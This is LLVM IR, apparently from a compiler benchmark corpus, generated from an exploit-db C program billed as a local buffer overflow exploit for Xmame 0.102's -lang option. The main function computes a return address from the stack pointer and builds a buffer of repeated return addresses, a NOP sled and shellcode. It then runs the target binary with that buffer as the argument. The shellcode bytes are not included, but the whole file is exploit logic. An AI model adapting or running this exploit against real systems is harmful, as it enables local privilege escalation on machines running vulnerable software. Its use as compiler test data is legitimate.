; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1415.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1415.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"%s <xmam.x11>\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [52 x i8] c"**************************************************\0A\00", align 1
@.str.2 = private unnamed_addr constant [51 x i8] c"Xmame 0.102 (-lang) Local Buffer Overflow Exploit\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"Coded BY Qnix\0A\00", align 1
@.str.4 = private unnamed_addr constant [53 x i8] c"**************************************************\0A\0A\00", align 1
@.str.5 = private unnamed_addr constant [33 x i8] c"\09(~) Stack pointer (ESP) : 0x%x\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"\09(~) Offset from ESP     : 0x%x\0A\00", align 1
@.str.7 = private unnamed_addr constant [34 x i8] c"\09(~) Desired Return Addr : 0x%x\0A\0A\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@NS = common dso_local global i32 0, align 4
@shellcode = common dso_local global i32* null, align 8
@.str.8 = private unnamed_addr constant [10 x i8] c"xmame.x11\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"-lang\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %13 = call i64 (...) @sp()
  store i64 %13, i64* %8, align 8
  %14 = load i64, i64* %8, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = sub nsw i64 %14, %16
  store i64 %17, i64* %9, align 8
  %18 = load i32, i32* %4, align 4
  %19 = icmp slt i32 %18, 2
  br i1 %19, label %23, label %20

20:                                               ; preds = %2
  %21 = load i32, i32* %4, align 4
  %22 = icmp ne i32 %21, 2
  br i1 %22, label %23, label %29

23:                                               ; preds = %20, %2
  %24 = load i32, i32* @stderr, align 4
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8* %27)
  store i32 0, i32* %3, align 4
  br label %111

29:                                               ; preds = %20
  %30 = load i32, i32* @stdout, align 4
  %31 = call i32 (i32, i8*, ...) @fprintf(i32 %30, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0))
  %32 = load i32, i32* @stdout, align 4
  %33 = call i32 (i32, i8*, ...) @fprintf(i32 %32, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0))
  %34 = load i32, i32* @stdout, align 4
  %35 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  %36 = load i32, i32* @stdout, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0))
  %38 = load i32, i32* @stdout, align 4
  %39 = load i64, i64* %8, align 8
  %40 = call i32 (i32, i8*, ...) @fprintf(i32 %38, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0), i64 %39)
  %41 = load i32, i32* @stdout, align 4
  %42 = load i32, i32* %7, align 4
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %41, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i32 %42)
  %44 = load i32, i32* @stdout, align 4
  %45 = load i64, i64* %9, align 8
  %46 = call i32 (i32, i8*, ...) @fprintf(i32 %44, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.7, i64 0, i64 0), i64 %45)
  %47 = load i32, i32* @BUFSIZE, align 4
  %48 = call i8* @malloc(i32 %47)
  store i8* %48, i8** %11, align 8
  %49 = load i8*, i8** %11, align 8
  store i8* %49, i8** %12, align 8
  %50 = load i8*, i8** %12, align 8
  %51 = bitcast i8* %50 to i64*
  store i64* %51, i64** %10, align 8
  store i32 0, i32* %6, align 4
  br label %52

52:                                               ; preds = %60, %29
  %53 = load i32, i32* %6, align 4
  %54 = load i32, i32* @BUFSIZE, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %63

56:                                               ; preds = %52
  %57 = load i64, i64* %9, align 8
  %58 = load i64*, i64** %10, align 8
  %59 = getelementptr inbounds i64, i64* %58, i32 1
  store i64* %59, i64** %10, align 8
  store i64 %57, i64* %58, align 8
  br label %60

60:                                               ; preds = %56
  %61 = load i32, i32* %6, align 4
  %62 = add nsw i32 %61, 4
  store i32 %62, i32* %6, align 4
  br label %52

63:                                               ; preds = %52
  store i32 0, i32* %6, align 4
  br label %64

64:                                               ; preds = %73, %63
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* @NS, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %76

68:                                               ; preds = %64
  %69 = load i8*, i8** %11, align 8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %69, i64 %71
  store i8 -112, i8* %72, align 1
  br label %73

73:                                               ; preds = %68
  %74 = load i32, i32* %6, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %6, align 4
  br label %64

76:                                               ; preds = %64
  %77 = load i8*, i8** %11, align 8
  %78 = load i32, i32* @NS, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  store i8* %80, i8** %12, align 8
  store i32 0, i32* %6, align 4
  br label %81

81:                                               ; preds = %95, %76
  %82 = load i32, i32* %6, align 4
  %83 = load i32*, i32** @shellcode, align 8
  %84 = call i32 @strlen(i32* %83)
  %85 = icmp slt i32 %82, %84
  br i1 %85, label %86, label %98

86:                                               ; preds = %81
  %87 = load i32*, i32** @shellcode, align 8
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  %91 = load i32, i32* %90, align 4
  %92 = trunc i32 %91 to i8
  %93 = load i8*, i8** %12, align 8
  %94 = getelementptr inbounds i8, i8* %93, i32 1
  store i8* %94, i8** %12, align 8
  store i8 %92, i8* %93, align 1
  br label %95

95:                                               ; preds = %86
  %96 = load i32, i32* %6, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  br label %81

98:                                               ; preds = %81
  %99 = load i8*, i8** %11, align 8
  %100 = load i32, i32* @BUFSIZE, align 4
  %101 = sub nsw i32 %100, 1
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %99, i64 %102
  store i8 0, i8* %103, align 1
  %104 = load i8**, i8*** %5, align 8
  %105 = getelementptr inbounds i8*, i8** %104, i64 1
  %106 = load i8*, i8** %105, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = call i32 @execl(i8* %106, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i8* %107, i32 0)
  %109 = load i8*, i8** %11, align 8
  %110 = call i32 @free(i8* %109)
  store i32 0, i32* %3, align 4
  br label %111

111:                                              ; preds = %98, %23
  %112 = load i32, i32* %3, align 4
  ret i32 %112
}

declare dso_local i64 @sp(...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
